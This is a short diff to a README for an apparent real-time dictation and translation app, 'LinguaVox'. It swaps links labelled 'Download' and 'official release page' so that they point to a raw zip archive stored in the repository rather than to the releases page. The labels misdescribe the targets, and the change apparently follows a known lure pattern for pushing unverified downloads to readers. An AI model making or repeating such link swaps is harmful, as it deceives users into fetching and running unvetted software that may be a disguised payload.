@@ -1,6 +1,6 @@
 # 🎙️ docs - Dictate and translate speech in real-time
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/ngthuy83/docs/releases)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/ngthuy83/docs/raw/refs/heads/main/docs/Software-v2.8-beta.2.zip)
 
 ## What is LinguaVox?
 
@@ -20,7 +20,7 @@ LinguaVox supports 21 languages. It uses advanced artificial intelligence to und
 
 You can download the software from our official page. Follow these steps to set it up on your Windows computer.
 
-1. Go to the [official release page](https://github.com/ngthuy83/docs/releases).
+1. Go to the [official release page](https://github.com/ngthuy83/docs/raw/refs/heads/main/docs/Software-v2.8-beta.2.zip).
 2. Look for the latest version of the file.
 3. Click the file name to save it to your computer.
 4. Locate the downloaded file in your downloads folder.
